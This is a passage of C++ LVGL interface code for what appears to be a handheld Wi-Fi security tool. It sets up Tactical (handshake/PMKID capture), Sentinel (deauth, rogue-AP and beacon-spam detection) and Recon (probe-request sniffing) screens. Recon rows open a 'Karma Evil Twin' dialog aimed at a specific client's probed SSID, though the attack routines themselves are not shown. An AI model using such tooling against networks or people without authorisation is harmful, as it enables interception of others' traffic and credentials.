    lv_obj_set_style_bg_opa(barRight, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(barRight, LV_OBJ_FLAG_SCROLLABLE);

    auto createStatusChip = [&](const char* text, lv_color_t col) -> lv_obj_t* {
        auto* chip = lv_obj_create(barRight);
        lv_obj_set_size(chip, 34, 18);
        lv_obj_set_style_pad_all(chip, 0, 0);
        lv_obj_set_style_radius(chip, 3, 0);
        lv_obj_set_style_border_width(chip, 1, 0);
        lv_obj_set_style_border_color(chip, col, 0);
        lv_obj_set_style_bg_color(chip, lv_color_hex(0x0C121E), 0);
        lv_obj_set_style_bg_opa(chip, LV_OPA_COVER, 0);
        lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_remove_flag(chip, LV_OBJ_FLAG_CLICKABLE);
        auto* l = lv_label_create(chip);
        lv_label_set_text(l, text);
        lv_obj_set_style_text_font(l, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(l, col, 0);
        lv_obj_center(l);
        return chip;
    };
    ctx->homeTacChip = createStatusChip("TAC", lv_color_hex(0xEF4444));
    ctx->homeSntChip = createStatusChip("SNT", lv_color_hex(0x14B8A6));
    ctx->homeRcnChip = createStatusChip("RCN", lv_color_hex(0xA855F7));

    // Stealth Mode High-Contrast Capsule Button (Font 12, width 104, height 20)
    ctx->homeStealthCapsule = lv_button_create(barRight);
    applyFocusStyle(ctx->homeStealthCapsule);
    lv_obj_set_size(ctx->homeStealthCapsule, 104, 20);
    lv_obj_set_style_pad_all(ctx->homeStealthCapsule, 0, 0);
    lv_obj_set_style_radius(ctx->homeStealthCapsule, 10, 0);
    lv_obj_set_style_border_width(ctx->homeStealthCapsule, 1, 0);
    lv_obj_set_style_border_color(ctx->homeStealthCapsule, lv_color_hex(0x38BDF8), 0);
    lv_obj_set_style_bg_color(ctx->homeStealthCapsule, lv_color_hex(0x121722), 0);
    lv_obj_set_style_bg_opa(ctx->homeStealthCapsule, LV_OPA_COVER, 0);
    lv_obj_remove_flag(ctx->homeStealthCapsule, LV_OBJ_FLAG_SCROLLABLE);
    lv_group_remove_obj(ctx->homeStealthCapsule);

    ctx->homeStealthBadge = lv_label_create(ctx->homeStealthCapsule);
    lv_label_set_text(ctx->homeStealthBadge, "STEALTH: OFF");
    lv_obj_set_style_text_font(ctx->homeStealthBadge, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ctx->homeStealthBadge, lv_color_hex(0xE2E8F0), 0);
    lv_obj_center(ctx->homeStealthBadge);

    lv_obj_add_event_cb(ctx->homeStealthCapsule, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        setStealthMode(ctx, !g_stealth_mode);
    }, LV_EVENT_CLICKED, ctx);
}

void createModuleHomePage(Context* ctx, lv_obj_t* parent) {
    ctx->moduleHomePage = lv_obj_create(parent);
    lv_obj_add_flag(ctx->moduleHomePage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_size(ctx->moduleHomePage, 320, 216);
    lv_obj_set_style_pad_all(ctx->moduleHomePage, 0, 0);
    lv_obj_set_style_border_width(ctx->moduleHomePage, 0, 0);
    lv_obj_remove_flag(ctx->moduleHomePage, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_layout(ctx->moduleHomePage, LV_LAYOUT_NONE);

    // Background Cyberpunk Artwork (320x216 RGB565)
    auto* bg = lv_image_create(ctx->moduleHomePage);
    const auto* imgDsc = getCyberHomeImage();
    if (imgDsc != nullptr) {
        lv_image_set_src(bg, imgDsc);
    }
    lv_obj_set_pos(bg, 0, 0);
    lv_obj_set_size(bg, 320, 216);
    lv_obj_remove_flag(bg, LV_OBJ_FLAG_CLICKABLE);

    // The 3 Cyberpunk Cards Hotspots over Linear Artwork (Font 12)
    auto createCardHotspot = [&](int x, int y, int w, int h, lv_color_t accentColor, lv_event_cb_t cb,
                                 lv_obj_t** b1Out, lv_obj_t** b2Out,
                                 lv_obj_t** b3Out = nullptr, lv_obj_t** b4Out = nullptr) -> lv_obj_t* {
        auto* card = lv_button_create(ctx->moduleHomePage);
        lv_obj_set_pos(card, x, y);
        lv_obj_set_size(card, w, h);
        lv_obj_set_style_pad_all(card, 0, 0);
        lv_obj_set_style_radius(card, 8, 0);
        lv_obj_set_layout(card, LV_LAYOUT_NONE);

        // Default: transparent so background card artwork shows through
        lv_obj_set_style_bg_opa(card, LV_OPA_TRANSP, LV_STATE_DEFAULT);
        lv_obj_set_style_border_width(card, 0, LV_STATE_DEFAULT);
        lv_obj_set_style_outline_width(card, 0, LV_STATE_DEFAULT);

        // Focused: high-contrast 3px neon border, outer halo, and 30% wash
        for (lv_state_t st : { LV_STATE_FOCUSED, LV_STATE_FOCUS_KEY }) {
            lv_obj_set_style_border_width(card, 3, st);
            lv_obj_set_style_border_color(card, accentColor, st);
            lv_obj_set_style_outline_width(card, 2, st);
            lv_obj_set_style_outline_color(card, accentColor, st);
            lv_obj_set_style_outline_pad(card, 1, st);
            lv_obj_set_style_bg_color(card, accentColor, st);
            lv_obj_set_style_bg_opa(card, LV_OPA_30, st);
        }
        lv_obj_set_style_bg_opa(card, LV_OPA_60, LV_STATE_PRESSED);
        lv_obj_remove_flag(card, LV_OBJ_FLAG_SCROLLABLE);

        // Extended Dark Slot Container: Vertically and Horizontally Centered
        auto* slotBox = lv_obj_create(card);
        lv_obj_set_pos(slotBox, 3, 94);
        lv_obj_set_size(slotBox, 86, 74);
        lv_obj_set_flex_flow(slotBox, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(slotBox, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_all(slotBox, 0, 0);
        lv_obj_set_style_pad_row(slotBox, 1, 0);
        lv_obj_set_style_bg_opa(slotBox, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(slotBox, 0, 0);
        lv_obj_remove_flag(slotBox, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_remove_flag(slotBox, LV_OBJ_FLAG_CLICKABLE);

        // Label 1 (Font 12)
        auto* b1 = lv_label_create(slotBox);
        lv_label_set_text(b1, "--");
        lv_obj_set_width(b1, LV_PCT(100));
        lv_label_set_long_mode(b1, LV_LABEL_LONG_MODE_CLIP);
        lv_obj_set_style_text_font(b1, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(b1, accentColor, 0);
        lv_obj_set_style_text_align(b1, LV_TEXT_ALIGN_CENTER, 0);
        if (b1Out != nullptr) *b1Out = b1;

        // Label 2 (Font 12)
        auto* b2 = lv_label_create(slotBox);
        lv_label_set_text(b2, "--");
        lv_obj_set_width(b2, LV_PCT(100));
        lv_label_set_long_mode(b2, LV_LABEL_LONG_MODE_CLIP);
        lv_obj_set_style_text_font(b2, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(b2, lv_color_hex(0x94A3B8), 0);
        lv_obj_set_style_text_align(b2, LV_TEXT_ALIGN_CENTER, 0);
        if (b2Out != nullptr) *b2Out = b2;

        // Optional Label 3 (Font 12)
        if (b3Out != nullptr) {
            auto* b3 = lv_label_create(slotBox);
            lv_label_set_text(b3, "--");
            lv_obj_set_style_text_font(b3, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(b3, lv_color_hex(0x94A3B8), 0);
            lv_obj_set_style_text_align(b3, LV_TEXT_ALIGN_CENTER, 0);
            *b3Out = b3;
        }

        // Optional Label 4 (Font 12)
        if (b4Out != nullptr) {
            auto* b4 = lv_label_create(slotBox);
            lv_label_set_text(b4, "--");
            lv_obj_set_style_text_font(b4, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(b4, lv_color_hex(0x94A3B8), 0);
            lv_obj_set_style_text_align(b4, LV_TEXT_ALIGN_CENTER, 0);
            *b4Out = b4;
        }

        // Bottom focus cursor (shows "◄ ENTER ►" in Font 12 only when focused)
        auto* cursor = lv_label_create(card);
        lv_label_set_text(cursor, "◄ ENTER ►");
        lv_obj_set_style_text_font(cursor, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(cursor, accentColor, 0);
        lv_obj_set_style_text_align(cursor, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_pos(cursor, 0, 172);
        lv_obj_set_size(cursor, w, 18);
        lv_obj_set_style_text_opa(cursor, LV_OPA_TRANSP, LV_STATE_DEFAULT);
        for (lv_state_t st : { LV_STATE_FOCUSED, LV_STATE_FOCUS_KEY }) {
            lv_obj_set_style_text_opa(cursor, LV_OPA_COVER, st);
        }

        lv_obj_add_event_cb(card, cb, LV_EVENT_CLICKED, ctx);
        return card;
    };

    // Card 1: Tactical (Rosso #FF4D4D, x=12, y=8, w=92, h=196)
    ctx->moduleTacticalCard = createCardHotspot(
        12, 8, 92, 196,
        lv_color_hex(0xFF4D4D),
        [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            showPage(ctx, Page::Graph);
        },
        &ctx->homeTacticalApBadge,
        &ctx->homeTacticalCliBadge,
        &ctx->homeTacticalHsBadge,
        &ctx->homeTacticalPmkBadge
    );

    // Card 2: Sentinel (Teal #2DD4BF, x=114, y=8, w=92, h=196)
    ctx->moduleSentinelCard = createCardHotspot(
        114, 8, 92, 196,
        lv_color_hex(0x2DD4BF),
        [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            showPage(ctx, Page::WidsDetail);
        },
        &ctx->homeSentinelBadge,
        &ctx->homeSentinelSubBadge
    );

    // Card 3: Recon (Viola #C084FC, x=216, y=8, w=92, h=196)
    ctx->moduleReconCard = createCardHotspot(
        216, 8, 92, 196,
        lv_color_hex(0xC084FC),
        [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            showPage(ctx, Page::Recon);
        },
        &ctx->homeReconBadge,
        &ctx->homeReconSubBadge
    );

    // Bottom prompt line removed
}

constexpr int COL_RECON_MAC = 106;
constexpr int COL_RECON_RSSI = 34;
constexpr int COL_RECON_PKT = 30;

struct ReconRowDataHolder {
    Context* ctx;
    uint64_t key;
};

void onReconRowClick(Context* ctx, uint64_t key) {
    if (ctx == nullptr) return;
    std::string targetSsid;
    uint8_t mac[6] = {};
    bool found = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->clients.find(key);
        if (it != ctx->clients.end()) {
            memcpy(mac, it->second.mac, 6);
            if (!it->second.probedSsids.empty()) {
                targetSsid = it->second.probedSsids.front();
            }
            found = true;
        }
        ctx->mutex.unlock();
    }
    if (!found) return;

    if (targetSsid.empty()) {
        char msg[128];
        snprintf(msg, sizeof(msg), "Client: %s\nNessun SSID specifico cercato (solo probe broadcast).", macToString(mac).c_str());
        tt::app::alertdialog::start(ctx->appInstanceId, "Client Probe", msg, { "OK" });
        return;
    }

    ctx->reconTargetClientKey = key;
    ctx->reconTargetSsid = targetSsid;

    char msg[160];
    snprintf(msg, sizeof(msg), "Creare Evil Twin per questo client?\n\nSSID: %s\nClient: %s",
        targetSsid.c_str(), macToString(mac).c_str());
    ctx->reconKarmaDialogId = tt::app::alertdialog::start(
        ctx->appInstanceId,
        "Karma Evil Twin",
        msg,
        { "Crea Evil Twin", "Annulla" }
    );
}

lv_obj_t* createReconRow(Context* ctx, uint64_t key) {
    auto* row = lv_list_add_button(ctx->reconList, nullptr, "");
    lv_obj_clean(row);
    applyFocusStyle(row);
    lv_obj_set_height(row, LIST_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);

    auto* holder = new ReconRowDataHolder{ctx, key};
    lv_obj_set_user_data(row, holder);
    lv_obj_add_event_cb(row, [](lv_event_t* e) {
        auto code = lv_event_get_code(e);
        auto* h = static_cast<ReconRowDataHolder*>(lv_event_get_user_data(e));
        if (code == LV_EVENT_DELETE) {
            delete h;
            return;
        }
        if (code == LV_EVENT_CLICKED && h != nullptr) {
            onReconRowClick(h->ctx, h->key);
        }
    }, LV_EVENT_ALL, holder);

    // Child 0: Accent chip
    auto* chip = lv_obj_create(row);
    lv_obj_set_size(chip, 6, LV_PCT(90));
    lv_obj_set_style_radius(chip, 2, 0);
    lv_obj_set_style_border_width(chip, 0, 0);
    lv_obj_set_style_pad_all(chip, 0, 0);
    lv_obj_set_style_bg_color(chip, lv_color_hex(0xC084FC), 0);
    lv_obj_set_style_bg_opa(chip, LV_OPA_COVER, 0);
    lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);

    // Child 1: Probe (SSID) - grows and scrolls horizontally if long
    auto* name = lv_label_create(row);
    lv_label_set_long_mode(name, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(name, 1);
    lv_obj_set_style_text_color(name, lv_color_hex(0xF1F5F9), 0);

    // Child 2: Client MAC
    auto* mac = addFieldLabel(row, COL_RECON_MAC);
    lv_obj_set_style_text_color(mac, lv_color_hex(0xC084FC), 0);

    // Child 3: dBm
    auto* rssi = addFieldLabel(row, COL_RECON_RSSI);
    lv_obj_set_style_text_color(rssi, lv_color_hex(0x38BDF8), 0);

    // Child 4: Pkt
    auto* pkt = addFieldLabel(row, COL_RECON_PKT);
    lv_obj_set_style_text_color(pkt, lv_color_hex(0x94A3B8), 0);

    return row;
}

void createReconPage(Context* ctx, lv_obj_t* parent) {
    ctx->reconPage = createPage(parent);
    lv_obj_add_flag(ctx->reconPage, LV_OBJ_FLAG_HIDDEN);

    // Table Header identical to tactical list
    auto* header = lv_obj_create(ctx->reconPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);

    auto* spacer = lv_obj_create(header);
    lv_obj_set_size(spacer, 6, 1);
    lv_obj_set_style_border_width(spacer, 0, 0);
    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);

    auto* nameHdr = lv_label_create(header);
    lv_label_set_text(nameHdr, "Probe (SSID)");
    lv_obj_set_flex_grow(nameHdr, 1);

    addLegendLabel(header, "Client (MAC)", COL_RECON_MAC);
    addLegendLabel(header, "dBm", COL_RECON_RSSI);
    addLegendLabel(header, "pkt", COL_RECON_PKT);

    // List container identical to tactical list
    ctx->reconList = lv_list_create(ctx->reconPage);
    lv_obj_set_width(ctx->reconList, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->reconList, 1);
    lv_obj_set_style_pad_all(ctx->reconList, 0, 0);
    lv_obj_set_style_pad_row(ctx->reconList, 2, 0);

    // Bottom control bar (Live counter & SNIFF toggle)
    auto* footer = lv_obj_create(ctx->reconPage);
    lv_obj_set_size(footer, LV_PCT(100), 26);
    lv_obj_set_flex_flow(footer, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(footer, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_hor(footer, 4, 0);
    lv_obj_set_style_pad_ver(footer, 0, 0);
    lv_obj_set_style_border_width(footer, 0, 0);
    lv_obj_set_style_bg_opa(footer, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(footer, LV_OBJ_FLAG_SCROLLABLE);

    ctx->reconStatsLabel = lv_label_create(footer);
    lv_label_set_text(ctx->reconStatsLabel, "Client con Probe: 0");
    lv_obj_set_style_text_color(ctx->reconStatsLabel, lv_color_hex(0xC084FC), 0);

    ctx->reconToggleButton = lv_button_create(footer);
    applyFocusStyle(ctx->reconToggleButton);
    lv_obj_set_height(ctx->reconToggleButton, 24);
    lv_obj_set_style_pad_hor(ctx->reconToggleButton, 8, 0);
    lv_obj_set_style_pad_ver(ctx->reconToggleButton, 0, 0);
    lv_obj_set_style_radius(ctx->reconToggleButton, 4, 0);
    lv_obj_set_style_border_width(ctx->reconToggleButton, 1, 0);
    lv_obj_set_style_border_color(ctx->reconToggleButton, lv_color_hex(0xA855F7), 0);
    lv_obj_set_style_bg_color(ctx->reconToggleButton, lv_color_hex(0x2E1065), 0);
    auto* btnLbl = lv_label_create(ctx->reconToggleButton);
    lv_label_set_text(btnLbl, LV_SYMBOL_PAUSE " SNIFF: ON");
    lv_obj_center(btnLbl);
    lv_obj_add_event_cb(ctx->reconToggleButton, onReconToggleClick, LV_EVENT_CLICKED, ctx);
}

void updateReconPage(Context* ctx) {
    if (ctx->reconList == nullptr) return;

    if (ctx->reconToggleButton != nullptr) {
        auto* btnLbl = lv_obj_get_child(ctx->reconToggleButton, 0);
        if (btnLbl != nullptr) {
            if (ctx->reconActive) {
                lv_label_set_text(btnLbl, LV_SYMBOL_PAUSE " SNIFF: ON");
                lv_obj_set_style_border_color(ctx->reconToggleButton, lv_color_hex(0xA855F7), 0);
                lv_obj_set_style_bg_color(ctx->reconToggleButton, lv_color_hex(0x2E1065), 0);
            } else {
                lv_label_set_text(btnLbl, LV_SYMBOL_PLAY " SNIFF: OFF");
                lv_obj_set_style_border_color(ctx->reconToggleButton, lv_color_hex(0x555555), 0);
                lv_obj_set_style_bg_color(ctx->reconToggleButton, lv_color_hex(0x181818), 0);
            }
        }
    }

    struct ReconRowData {
        uint64_t key;
        std::string mac;
        int rssi;
        std::string probedSsids;
        uint32_t packetCount;
    };
    std::vector<ReconRowData> items;

    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, c] : ctx->clients) {
            if (c.probedSsids.empty()) continue;
            bool randomMac = (c.mac[0] & 0x02) != 0;
            std::string macStr = macToString(c.mac) + (randomMac ? "*" : "");
            std::string ssidsJoined;
            for (size_t i = 0; i < c.probedSsids.size(); i++) {
                if (i > 0) ssidsJoined += ", ";
                ssidsJoined += c.probedSsids[i];
            }
            items.push_back({k, macStr, c.lastRssi, ssidsJoined, c.packetCount});
        }
        ctx->mutex.unlock();
    }

    std::sort(items.begin(), items.end(), [](const ReconRowData& a, const ReconRowData& b) {
        return a.packetCount > b.packetCount;
    });

    std::vector<uint64_t> currentKeys;
    for (const auto& itm : items) currentKeys.push_back(itm.key);

    for (auto it = ctx->reconRows.begin(); it != ctx->reconRows.end();) {
        if (std::find(currentKeys.begin(), currentKeys.end(), it->first) == currentKeys.end()) {
            lv_obj_delete(it->second);
            it = ctx->reconRows.erase(it);
        } else {
            ++it;
        }
    }

    for (const auto& itm : items) {
        lv_obj_t* row = nullptr;
        auto it = ctx->reconRows.find(itm.key);
        if (it == ctx->reconRows.end()) {
            row = createReconRow(ctx, itm.key);
            ctx->reconRows[itm.key] = row;
        } else {
            row = it->second;
        }

        // Child 0: Chip (tinted based on signal)
        auto* chip = lv_obj_get_child(row, 0);
        uint32_t chipColor = (itm.rssi >= -70) ? 0x22C55E : (itm.rssi >= -85) ? 0xF59E0B : 0xEF4444;
        lv_obj_set_style_bg_color(chip, lv_color_hex(chipColor), 0);

        // Child 1: Probe (SSID)
        auto* name = lv_obj_get_child(row, 1);
        lv_label_set_text(name, itm.probedSsids.empty() ? "(Broadcast)" : itm.probedSsids.c_str());

        // Child 2: MAC
        auto* macL = lv_obj_get_child(row, 2);
        lv_label_set_text(macL, itm.mac.c_str());

        // Child 3: dBm
        auto* rssiL = lv_obj_get_child(row, 3);
        char rssiBuf[8];
        snprintf(rssiBuf, sizeof(rssiBuf), "%d", itm.rssi);
        lv_label_set_text(rssiL, rssiBuf);

        // Child 4: Pkt
        auto* pktL = lv_obj_get_child(row, 4);
        char pktBuf[8];
        snprintf(pktBuf, sizeof(pktBuf), "%u", (unsigned)itm.packetCount);
        lv_label_set_text(pktL, pktBuf);
    }

    if (ctx->reconStatsLabel != nullptr) {
        char buf[64];
        snprintf(buf, sizeof(buf), "Client Probe: %u | %s", (unsigned)items.size(),
            ctx->reconActive ? "Sniffing Attivo" : "In Pausa");
        lv_label_set_text(ctx->reconStatsLabel, buf);
    }
}

void createGraphPage(Context* ctx, lv_obj_t* parent) {
    ctx->graphPage = createPage(parent);

    auto* mainRow = lv_obj_create(ctx->graphPage);
    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(mainRow, 0, 0);
    lv_obj_set_style_pad_column(mainRow, 4, 0);
    lv_obj_set_style_border_width(mainRow, 0, 0);
    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);

    auto* leftColumn = lv_obj_create(mainRow);
    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(leftColumn, LV_PCT(100));
    lv_obj_set_flex_grow(leftColumn, 1);
    lv_obj_set_style_pad_all(leftColumn, 0, 0);
    lv_obj_set_style_border_width(leftColumn, 0, 0);
    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);

    auto* chartWrapper = lv_obj_create(leftColumn);
    lv_obj_set_width(chartWrapper, LV_PCT(100));
    lv_obj_set_flex_grow(chartWrapper, 1);
    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
    lv_obj_set_style_border_width(chartWrapper, 0, 0);
    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);

    ctx->chart = lv_chart_create(chartWrapper);
    lv_obj_set_size(ctx->chart, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->chart, 0, 0);
    lv_chart_set_type(ctx->chart, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(ctx->chart, CHART_POINTS);
    lv_chart_set_axis_range(ctx->chart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
    lv_chart_set_div_line_count(ctx->chart, 3, 0);
    lv_obj_set_style_size(ctx->chart, 0, 0, LV_PART_INDICATOR);
    lv_obj_set_style_line_width(ctx->chart, 2, LV_PART_ITEMS);
    lv_obj_remove_flag(ctx->chart, LV_OBJ_FLAG_SCROLLABLE);
    for (int i = 0; i < MAX_SERIES; i++) {
        ctx->series[i] = lv_chart_add_series(ctx->chart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }

    createChannelGrid(chartWrapper);

    ctx->activeChannelIndicator = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->activeChannelIndicator, 14, LV_PCT(100));
    lv_obj_set_style_border_width(ctx->activeChannelIndicator, 1, 0);
    lv_obj_set_style_border_color(ctx->activeChannelIndicator, lv_color_hex(0xEF4444), 0);
    lv_obj_set_style_radius(ctx->activeChannelIndicator, 3, 0);
    lv_obj_set_style_bg_color(ctx->activeChannelIndicator, lv_color_hex(0xEF4444), 0);
    lv_obj_set_style_bg_opa(ctx->activeChannelIndicator, LV_OPA_20, 0);
    lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);

    createYAxisLabels(chartWrapper);

    ctx->statsLabel = lv_label_create(chartWrapper);
    lv_obj_set_pos(ctx->statsLabel, 6, 4);
    lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0x888888), 0);
    lv_label_set_text(ctx->statsLabel, "0 AP (Fermo)");
    ctx->statusLabel = ctx->statsLabel;
    lv_obj_add_flag(ctx->statsLabel, LV_OBJ_FLAG_HIDDEN);

    ctx->labelLayer = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->labelLayer, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->labelLayer, 0, 0);
    lv_obj_set_style_bg_opa(ctx->labelLayer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(ctx->labelLayer, 0, 0);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_CLICKABLE);

    createAxisLabels(leftColumn);

    constexpr int BTN_W = 40;
    constexpr int BTN_H = 40;
    auto* rightColumn = lv_obj_create(mainRow);
    lv_obj_set_size(rightColumn, BTN_W, LV_PCT(100));
    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(rightColumn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(rightColumn, 0, 0);
    lv_obj_set_style_pad_row(rightColumn, 16, 0);
    lv_obj_set_style_border_width(rightColumn, 0, 0);
    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);

    ctx->tacticalModeBadges = {};

    ctx->scanButton = nullptr;
    // 1. Channel Hopping Start/Toggle button
    ctx->captureButton = createIconButton(rightColumn, LV_SYMBOL_EYE_OPEN, onHopToggleClick, ctx, BTN_W, BTN_H);
    ctx->stopButton = nullptr;
    // 2. AP List button
    createIconButton(rightColumn, LV_SYMBOL_LIST, onShowList, ctx, BTN_W, BTN_H);
    ctx->widsButton = nullptr;
    refreshModeButtons(ctx);
}

void updateWidsGraph(Context* ctx, const std::vector<SeenAp>& aps) {
    if (ctx->widsChart == nullptr) return;

    lv_obj_clean(ctx->widsLabelLayer);
    int chartWidth = lv_obj_get_width(ctx->widsChart);
    int chartHeight = lv_obj_get_height(ctx->widsChart);

    int drawn = 0;
    for (const auto& ap : aps) {
        if (drawn >= MAX_SERIES) break;
        if (ap.record.channel < 1 || ap.record.channel > 13) continue;

        uint32_t color = SERIES_COLORS[ap.colorIndex % MAX_SERIES];
        lv_chart_set_series_color(ctx->widsChart, ctx->widsSeries[drawn], lv_color_hex(color));
        fillBell(ctx->widsChart, ctx->widsSeries[drawn], ap.record.channel, ap.record.rssi);
        lv_chart_hide_series(ctx->widsChart, ctx->widsSeries[drawn], false);

        auto* label = lv_label_create(ctx->widsLabelLayer);
        lv_label_set_text(label, displaySsid(ap.record));
        lv_obj_set_style_text_color(label, lv_color_hex(color), 0);
        lv_obj_update_layout(label);
        int width = lv_obj_get_width(label);
        int height = lv_obj_get_height(label);

        int xPx = (int)(chartWidth * channelFraction(ap.record.channel)) - width / 2;
        if (xPx < 0) xPx = 0;
        if (xPx + width > chartWidth) xPx = chartWidth - width;

        int32_t peak = std::clamp<int32_t>(ap.record.rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
        int yPx = chartHeight - (chartHeight * peak / SIGNAL_RANGE_DB);
        yPx -= height;
        if (yPx < 0) yPx = 0;
        if (yPx + height > chartHeight) yPx = chartHeight - height;

        lv_obj_set_pos(label, xPx, yPx);
        drawn++;
    }
    for (int i = drawn; i < MAX_SERIES; i++) {
        lv_chart_hide_series(ctx->widsChart, ctx->widsSeries[i], true);
    }
    lv_chart_refresh(ctx->widsChart);

    if (ctx->widsActiveChannelIndicator != nullptr) {
        if (ctx->widsActive && chartWidth > 0) {
            int lock = getCaptureLockChannel();
            int hop = g_hopChannel.load();
            int ch = (lock >= 1 && lock <= 13) ? lock : hop;
            if (ch >= 1 && ch <= 13) {
                float frac = channelFraction(ch);
                int indW = 14;
                int xCenter = (int)(frac * (float)chartWidth);
                int xPos = std::clamp(xCenter - indW / 2, 0, chartWidth - indW);
                lv_obj_set_x(ctx->widsActiveChannelIndicator, xPos);
                lv_obj_set_style_border_color(ctx->widsActiveChannelIndicator, lv_color_hex(0x14B8A6), 0);
                lv_obj_set_style_bg_color(ctx->widsActiveChannelIndicator, lv_color_hex(0x14B8A6), 0);
                lv_obj_remove_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_HIDDEN);
            } else {
                lv_obj_add_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_HIDDEN);
            }
        } else {
            lv_obj_add_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_HIDDEN);
        }
    }

    if (ctx->widsStatsLabel != nullptr) {
        WidsAttackType threat = ctx->widsActiveThreat.load();
        uint32_t rate = ctx->widsLastDeauthRate.load();
        char buf[64];
        if (threat == WidsAttackType::DeauthFlood) {
            snprintf(buf, sizeof(buf), "[!] DEAUTH FLOOD (%u/s)", (unsigned)rate);
            lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0xEF4444), 0);
        } else if (threat == WidsAttackType::RogueApClone) {
            snprintf(buf, sizeof(buf), "[!] ROGUE AP CLONE RILEVATO");
            lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0xF97316), 0);
        } else if (threat == WidsAttackType::BeaconSpam) {
            snprintf(buf, sizeof(buf), "[!] BEACON SPAM ATTIVO");
            lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0xF59E0B), 0);
        } else if (ctx->widsActive) {
            int lock = getCaptureLockChannel();
            int hop = g_hopChannel.load();
            int ch = (lock >= 1 && lock <= 13) ? lock : hop;
            size_t clientCount = 0;
            if (ctx->mutex.lock(0)) {
                clientCount = ctx->clients.size();
                ctx->mutex.unlock();
            }
            snprintf(buf, sizeof(buf), "CH %d | %u AP | %u CLI", ch, (unsigned)aps.size(), (unsigned)clientCount);
